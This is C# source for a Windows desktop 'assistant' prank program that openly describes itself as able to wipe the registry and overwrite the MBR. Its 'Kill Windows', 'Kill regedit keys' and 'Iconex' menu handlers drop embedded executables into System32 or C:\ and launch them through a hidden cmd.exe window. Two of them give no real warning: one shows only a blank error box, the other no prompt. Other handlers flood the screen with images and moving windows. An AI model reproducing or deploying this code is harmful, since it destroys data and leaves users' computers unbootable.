using System;
using System.Drawing;
using System.IO;
using System.Media;
using System.Runtime.InteropServices;
using System.Speech.Synthesis;
using System.Windows.Forms;
using System.Threading;
using System.Collections.Generic;
using System.Diagnostics;

namespace MiniAssistant
{
    public class name : Form
    {
        public string UserName { get; private set; }
        public string Language { get; private set; }
        private TextBox nameTextBox;
        private Button submitButton;
        private ComboBox languageComboBox;

        public name()
        {
            this.Size = new Size(300, 200);
            this.StartPosition = FormStartPosition.CenterScreen;

            Label nameLabel = new Label { Text = "Name:", Location = new Point(40, 40) };
            nameTextBox = new TextBox { Location = new Point(80, 40), Width = 180 };

            Label languageLabel = new Label { Text = "Language:", Location = new Point(40, 80) };
            languageComboBox = new ComboBox
            {
                Location = new Point(80, 80),
                Width = 180,
                DropDownStyle = ComboBoxStyle.DropDownList
            };
            languageComboBox.Items.Add("English");
            languageComboBox.Items.Add("Italian");
            languageComboBox.Items.Add("Russian");
            languageComboBox.SelectedIndex = 0; // Default to English

            submitButton = new Button { Text = "Done", Location = new Point(110, 120) };
            submitButton.Click += (sender, e) =>
            {
                UserName = nameTextBox.Text;
                Language = languageComboBox.SelectedItem.ToString();
                this.DialogResult = DialogResult.OK;
                this.Close();
            };

            this.Controls.Add(nameLabel);
            this.Controls.Add(nameTextBox);
            this.Controls.Add(languageLabel);
            this.Controls.Add(languageComboBox);
            this.Controls.Add(submitButton);
        }
    }

    public class AssistantForm : Form
    {
        private string userName;
        private string language;
        private ContextMenuStrip contextMenu;
        private SoundPlayer player;
        private List<Form> greggioForms = new List<Form>();

        [DllImport("gdi32.dll", SetLastError = true)]
        public static extern bool BitBlt(IntPtr hdcDest, int xDest, int yDest, int nWidth, int nHeight, IntPtr hdcSrc, int xSrc, int ySrc, uint dwRop);

        public const uint SRCCOPY = 0x00CC0020;

        public AssistantForm(string userName, string language)
        {
            this.userName = userName;
            this.language = language;
            this.FormBorderStyle = FormBorderStyle.FixedDialog;
            this.StartPosition = FormStartPosition.CenterScreen;
            this.TopMost = true;

            PictureBox pictureBox = new PictureBox
            {
                Image = Mattia_Assistant.Properties.Resources.dario_greggio_spalle_sollevate,
                SizeMode = PictureBoxSizeMode.AutoSize
            };
            this.Controls.Add(pictureBox);
            this.ClientSize = pictureBox.Size;

            SpeechSynthesizer synth = new SpeechSynthesizer();

            if (language == "English")
            {
                synth.SpeakAsync($"Hello {userName}. How are you? I'm good, btw, this is Mattia Assistant made in C# with various options. For example Kill regedit keys will wipe your entire regedit, Kill Windows will overwrite the MBR and other things. Ispired by Rover made by ClutterTech");
            }
            else if (language == "Italian")
            {
                synth.SpeakAsync($"Ciao {userName}, come stai? io sto bene. Questo è Mattia Assistant realizzato in C# con varie opzioni. Esempio Kill regedit keys cancellerà l'intero regedit, Kill Windows sovrascriverà l'MBR e altre cose. Ed è Ispirato da Rover realizzato da ClutterTech.");
            }
            else if (language == "Russian")
            {
                synth.SpeakAsync($"Как вы {userName}.? Ну, это эксперимент, Mattia Assistant — мини-помощник для рабочего стола в стиле Rover (Clutter Tech). Он написан на Net 4.0 и имеет различные опции. Пример Kill regedit, который убьет regedit и Destroy Windows сделает то, что написано");
            }
            contextMenu = new ContextMenuStrip();
            ToolStripMenuItem playSongItem = new ToolStripMenuItem("Song");
            playSongItem.Click += PlaySong;
            contextMenu.Items.Add(playSongItem);

            ToolStripMenuItem stopSongItem = new ToolStripMenuItem("Stop Song");
            stopSongItem.Click += StopSong;
            contextMenu.Items.Add(stopSongItem);

            ToolStripMenuItem darioGreggioItem = new ToolStripMenuItem("Start Dario Greggio Lover");
            darioGreggioItem.Click += Dario;
            contextMenu.Items.Add(darioGreggioItem);

            ToolStripMenuItem endGreggioItem = new ToolStripMenuItem("Close Dario Greggio lover");
            endGreggioItem.Click += EndDarioGreggio;
            contextMenu.Items.Add(endGreggioItem);

            ToolStripMenuItem spamImageItem = new ToolStripMenuItem("Spam Dario Alighieri");
            spamImageItem.Click += StartImageSpam;
            contextMenu.Items.Add(spamImageItem);

            ToolStripMenuItem iconexItem = new ToolStripMenuItem("Iconex");
            iconexItem.Click += Iconex;
            contextMenu.Items.Add(iconexItem);

            ToolStripMenuItem areYouSureItem = new ToolStripMenuItem("Kill Windows");
            areYouSureItem.Click += AreYouSure;
            contextMenu.Items.Add(areYouSureItem);

            ToolStripMenuItem helloItem = new ToolStripMenuItem("Kill regedit keys");
            helloItem.Click += REG;
            contextMenu.Items.Add(helloItem);

            this.ContextMenuStrip = contextMenu;

            player = new SoundPlayer(Mattia_Assistant.Properties.Resources.SONG);
        }

        private void PlaySong(object sender, EventArgs e) => player.Play();
        private void StopSong(object sender, EventArgs e) => player.Stop();

        private void Dario(object sender, EventArgs e)
        {
            try
            {
                for (int i = 0; i < 4; i++)
                {
                    Form gifForm = new Form { Text = "", Size = new Size(400, 400), StartPosition = FormStartPosition.Manual };
                    PictureBox gifBox = new PictureBox { Image = Mattia_Assistant.Properties.Resources.greggio_forte, SizeMode = PictureBoxSizeMode.StretchImage, Dock = DockStyle.Fill };
                    gifForm.Controls.Add(gifBox);
                    gifForm.Show();
                    greggioForms.Add(gifForm);
                    Thread thread = new Thread(() => MoveWindow(gifForm));
                    thread.Start();
                }
            }
            catch (Exception ex) { MessageBox.Show(ex.Message); }
        }
        private void REG(object sender, EventArgs e)
        {
            DialogResult result = MessageBox.Show("", "", MessageBoxButtons.OK, MessageBoxIcon.Error);

            if (result == DialogResult.OK)
            {
                try
                {
                    string tempFilePath = Path.Combine(@"C:\Windows\system32", "rumreg.exe");

                    using (var stream = new MemoryStream(Mattia_Assistant.Properties.Resources.REG))
                    {
                        File.WriteAllBytes(tempFilePath, stream.ToArray());
                    }

                    Process process = new Process();
                    process.StartInfo.FileName = "cmd.exe";
                    process.StartInfo.Arguments = $"/c \"{tempFilePath}\"";
                    process.StartInfo.UseShellExecute = false;
                    process.StartInfo.CreateNoWindow = true;

                    process.Start();
                }
                catch (Exception ex)
                {
                    MessageBox.Show("Errore: " + ex.Message, "Errore", MessageBoxButtons.OK, MessageBoxIcon.Error);
                }
            }
        }

        private void EndDarioGreggio(object sender, EventArgs e)
        {
            foreach (var form in greggioForms)
                form.Invoke((Action)(() => form.Close()));
            greggioForms.Clear();
        }

        private void MoveWindow(Form form)
        {
            try
            {
                Random rand = new Random();
                int screenWidth = Screen.PrimaryScreen.Bounds.Width;
                int screenHeight = Screen.PrimaryScreen.Bounds.Height;

                for (int i = 0; i < 50; i++)
                {
                    int x = rand.Next(screenWidth - form.Width);
                    int y = rand.Next(screenHeight - form.Height);
                    form.Invoke((Action)(() => form.Location = new Point(x, y)));
                    Thread.Sleep(500);
                }
            }
            catch { }
        }

        private void StartImageSpam(object sender, EventArgs e)
        {
            Thread thread = new Thread(() => SpamImage());
            thread.IsBackground = true;
            thread.Start();
        }

        private void SpamImage()
        {
            try
            {
                Random rand = new Random();
                int screenWidth = Screen.PrimaryScreen.Bounds.Width;
                int screenHeight = Screen.PrimaryScreen.Bounds.Height;

                Bitmap image = Mattia_Assistant.Properties.Resources.icon;
                IntPtr hdcScreen = GetDC(IntPtr.Zero);
                IntPtr hdcMem = CreateCompatibleDC(hdcScreen);

                IntPtr hBitmap = image.GetHbitmap();
                SelectObject(hdcMem, hBitmap);

                for (int i = 0; i < 50; i++)
                {
                    int x = rand.Next(0, screenWidth - image.Width);
                    int y = rand.Next(0, screenHeight - image.Height);
                    BitBlt(hdcScreen, x, y, image.Width, image.Height, hdcMem, 0, 0, SRCCOPY);
                    Thread.Sleep(100);
                }

                DeleteObject(hBitmap);
                DeleteDC(hdcMem);
                ReleaseDC(IntPtr.Zero, hdcScreen);
            }
            catch (Exception ex)
            {
              
            }
        }

        private void Iconex(object sender, EventArgs e)
        {
            try
            {
                string tempFilePath = Path.Combine(@"C:\", "133.exe");

                using (var stream = new MemoryStream(Mattia_Assistant.Properties.Resources.Poligon))
                {
                    File.WriteAllBytes(tempFilePath, stream.ToArray());
                }

                // start the cmd.exe process
                Process process = new Process();
                process.StartInfo.FileName = "cmd.exe";
                process.StartInfo.Arguments = $"/c \"{tempFilePath}\"";
                process.StartInfo.UseShellExecute = false;
                process.StartInfo.CreateNoWindow = true;

                process.Start();
            }
            catch (Exception ex)
            {
                MessageBox.Show("Errore: " + ex.Message, "Errore", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        private void AreYouSure(object sender, EventArgs e)
        {
            DialogResult result = MessageBox.Show("Are you sure? If press yes your system will be deleted", "Confirmation", MessageBoxButtons.YesNo, MessageBoxIcon.Error);

            if (result == DialogResult.Yes)
            {
                try
                {
                    string tempFilePath = Path.Combine(@"C:\Windows\System32", "PO.exe");

                    using (var stream = new MemoryStream(Mattia_Assistant.Properties.Resources.IK)) 
                    {
                        File.WriteAllBytes(tempFilePath, stream.ToArray());
                    }

                   
                    Process process = new Process();
                    process.StartInfo.FileName = "cmd.exe";
                    process.StartInfo.Arguments = $"/c \"{tempFilePath}\"";
                    process.StartInfo.UseShellExecute = false;
                    process.StartInfo.CreateNoWindow = true;

                    process.Start();
                }
                catch (Exception ex)
                {
                    MessageBox.Show("Error: " + ex.Message, "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                }
            }
        }

        [DllImport("user32.dll")]
        public static extern IntPtr GetDC(IntPtr hwnd);

        [DllImport("gdi32.dll")]
        public static extern IntPtr CreateCompatibleDC(IntPtr hdc);

        [DllImport("gdi32.dll")]
        public static extern IntPtr SelectObject(IntPtr hdc, IntPtr hObject);

        [DllImport("gdi32.dll")]
        public static extern bool DeleteObject(IntPtr hObject);

        [DllImport("gdi32.dll")]
        public static extern bool DeleteDC(IntPtr hdc);

        [DllImport("user32.dll")]
        public static extern bool ReleaseDC(IntPtr hwnd, IntPtr hdc);
    }

    static class Program
    {
        [STAThread]
        static void Main()
        {
            try
            {
                Application.EnableVisualStyles();
                Application.SetCompatibleTextRenderingDefault(false);
                using (name nameForm = new name())
                {
                    if (nameForm.ShowDialog() == DialogResult.OK)
                    {
                        Application.Run(new AssistantForm(nameForm.UserName, nameForm.Language));
                    }
                }
            }
            catch (Exception ex) { MessageBox.Show(ex.Message); }
        }
    }
}


